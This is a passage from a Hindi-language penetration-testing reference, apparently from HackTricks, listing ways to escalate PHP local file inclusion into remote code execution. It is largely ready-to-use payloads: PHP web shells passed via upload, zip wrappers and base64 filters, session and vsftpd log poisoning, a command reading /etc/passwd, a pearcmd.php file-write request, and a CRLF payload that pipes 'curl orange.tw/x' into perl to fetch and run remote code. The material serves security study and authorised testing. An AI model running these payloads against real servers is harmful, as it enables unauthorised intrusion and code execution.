यदि आप कोई फ़ाइल अपलोड कर सकते हैं, तो उसमें shell payload इंजेक्ट करें (उदा: `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
फ़ाइल को पढ़ने योग्य रखने के लिए सबसे अच्छा है कि इसे pictures/doc/pdf के metadata में इंजेक्ट किया जाए

### Zip file अपलोड के माध्यम से

एक ZIP file अपलोड करें जिसमें compressed PHP shell शामिल हो और फिर उसे एक्सेस करें:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP Session के माध्यम से

जाँचें कि वेबसाइट PHP Session (PHPSESSID) का उपयोग करती है या नहीं
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP में ये sessions _/var/lib/php5/sess\\_\[PHPSESSID]\_ files में संग्रहीत होते हैं
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
cookie को `<?php system('cat /etc/passwd');?>` पर सेट करें
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
LFI का उपयोग करके PHP session file को include करें
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### ssh के माध्यम से

अगर ssh सक्रिय है तो जांचें कि कौन सा user उपयोग हो रहा है (/proc/self/status & /etc/passwd) और कोशिश करें **\<HOME>/.ssh/id_rsa** तक पहुँचने की।

### **के माध्यम से** **vsftpd** _**logs**_

FTP सर्वर vsftpd के लॉग _**/var/log/vsftpd.log**_ पर स्थित होते हैं। यदि Local File Inclusion (LFI) vulnerability मौजूद है और exposed vsftpd server तक पहुँच संभव है, तो निम्नलिखित कदम अपनाए जा सकते हैं:

1. लॉगिन प्रक्रिया के दौरान username फ़ील्ड में PHP payload inject करें।
2. Injection के बाद, LFI का उपयोग करके सर्वर के लॉग _**/var/log/vsftpd.log**_ को प्राप्त करें।

### php base64 filter (using base64) के माध्यम से

जैसा कि [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) article में दिखाया गया है, PHP base64 filter सिर्फ Non-base64 को ignore करता है। आप इसका उपयोग file extension check को bypass करने के लिए कर सकते हैं: यदि आप ऐसा base64 सप्लाई करते हैं जो ".php" पर समाप्त होता है, तो यह सिर्फ "." को ignore कर देगा और base64 में "php" append कर देगा। यहाँ एक example payload है:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### php filters के माध्यम से (कोई फ़ाइल आवश्यक नहीं)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) समझाता है कि आप आउटपुट के रूप में **php filters to generate arbitrary content** का उपयोग कर सकते हैं। जिसका मूल अर्थ यह है कि आप include के लिए **generate arbitrary php code** कर सकते हैं, और वह भी इसे किसी फ़ाइल में लिखने की आवश्यकता के बिना।

{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Segmentation fault के जरिए

**Upload** एक फ़ाइल जो `/tmp` में **temporary** के रूप में स्टोर होगी, फिर उसी **same request,** में एक **segmentation fault** ट्रिगर करें, और तब वह **temporary file won't be deleted** होगा और आप उसे खोज सकते हैं।

{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Nginx temp file storage के जरिए

यदि आपने **Local File Inclusion** पाया है और **Nginx** PHP के सामने चल रहा है, तो आप निम्न तकनीक से RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### PHP_SESSION_UPLOAD_PROGRESS के जरिए

यदि आपने **Local File Inclusion** पाया है भले ही आपकी **don't have a session** हो और `session.auto_start` `Off` हो। यदि आप **`PHP_SESSION_UPLOAD_PROGRESS`** को **multipart POST** डेटा में भेजते हैं, तो PHP आपके लिए **enable the session for you** कर देगा। आप इसका दुरुपयोग करके RCE प्राप्त कर सकते हैं:

{{#ref}}
via-php_session_upload_progress.md
{{#endref}}

### Windows में temp file uploads के जरिए

यदि आपने **Local File Inclusion** पाया है और सर्वर **Windows** पर चल रहा है, तो आप RCE प्राप्त कर सकते हैं:

{{#ref}}
lfi2rce-via-temp-file-uploads.md
{{#endref}}

### `pearcmd.php` + URL args के जरिए

As [**explained in this post**](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp), `/usr/local/lib/phppearcmd.php` script php docker images में डिफ़ॉल्ट रूप से मौजूद है। इसके अलावा, URL के माध्यम से script को arguments पास करना संभव है क्योंकि बताया गया है कि यदि किसी URL param में `=` नहीं है, तो उसे argument के रूप में उपयोग किया जाना चाहिए। देखिए भी [watchTowr’s write-up](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/) और [Orange Tsai’s “Confusion Attacks”](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/).

The following request create a file in `/tmp/hello.php` with the content `<?=phpinfo()?>`:
```bash
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php HTTP/1.1
```
निम्नलिखित CRLF vuln का दुरुपयोग करके RCE प्राप्त करता है (से [**here**](https://blog.orange.tw/2024/08/confusion-attacks-en.html?m=1)):
```
http://server/cgi-bin/redir.cgi?r=http:// %0d%0a
Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### phpinfo() के माध्यम से (file_uploads = on)

यदि आपने एक **Local File Inclusion** पाया है और एक फाइल जो **phpinfo()** दिखा रही है जिसमें file_uploads = on है, तो आप RCE प्राप्त कर सकते हैं:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure के माध्यम से

यदि आपने एक **Local File Inclusion** पाया है और आप temp file का path **exfiltrate** कर सकते हैं BUT **server** यह **चेक** कर रहा है कि **include की जाने वाली फ़ाइल में PHP marks हैं**, तो आप इस **Race Condition** के साथ उस चेक को **bypass** करने की कोशिश कर सकते हैं:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### eternal waiting + bruteforce के माध्यम से

यदि आप LFI का दुरुपयोग करके **temporary files upload** कर सकते हैं और server के कारण PHP execution को **hang** करवा सकते हैं, तो आप घंटों तक filenames को **brute force** करके temporary file ढूँढ सकते हैं:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### Fatal Error तक

यदि आप किसी भी फ़ाइल को include करते हैं `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (आपको वही फ़ाइल 2 बार include करनी होगी ताकि वह error फेंके).

**मुझे नहीं पता कि यह कितना उपयोगी है पर यह हो सकता है।**\
_भले ही आप एक PHP Fatal Error उत्पन्न करें, PHP द्वारा upload की गई temporary files delete कर दी जाती हैं._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>


## References

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
